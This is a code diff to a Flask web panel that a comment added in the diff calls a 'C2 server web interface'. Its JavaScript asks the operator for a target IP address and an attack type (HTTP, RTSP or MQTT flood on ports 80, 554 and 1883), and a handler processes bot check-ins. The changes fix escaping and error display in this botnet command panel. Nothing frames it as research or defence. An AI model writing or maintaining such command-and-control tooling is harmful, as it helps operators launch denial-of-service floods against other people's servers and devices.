@@ -1,3 +1,4 @@
+# C2 server web interface
 from flask import render_template_string, jsonify, request
 import logging
 
@@ -213,7 +214,7 @@ HTML_TEMPLATE = '''
             const target = prompt('Enter target IP address:');
             if (!target) return;
             
-            const attackType = prompt('Attack type:\nsyn - HTTP flood (port 80)\nrtsp - RTSP flood (port 554)\nmqtt - MQTT flood (port 1883)\n\nEnter type:');
+            const attackType = prompt('Attack type:\\nsyn - HTTP flood (port 80)\\nrtsp - RTSP flood (port 554)\\nmqtt - MQTT flood (port 1883)\\n\\nEnter type:');
             if (!attackType || !['syn', 'rtsp', 'mqtt'].includes(attackType.toLowerCase())) {
                 alert('Invalid attack type. Use: syn, rtsp, or mqtt');
                 return;
@@ -275,7 +276,7 @@ HTML_TEMPLATE = '''
                       alert(`✓ ${data.message}`);
                       setTimeout(() => location.reload(), 2000);
                   } else {
-                      alert(`✗ ${data.message}`);
+                      alert(`✗ ${data.error}`);
                   }
               })
               .catch(err => alert('Error: ' + err));
@@ -339,4 +340,4 @@ def handle_bot_checkin(db_manager, data):
 
     except Exception as e:
         logging.error(f"Error in bot check-in: {e}")
-        return jsonify({'error': str(e)}), 500 
+        return jsonify({'error': str(e)}), 500
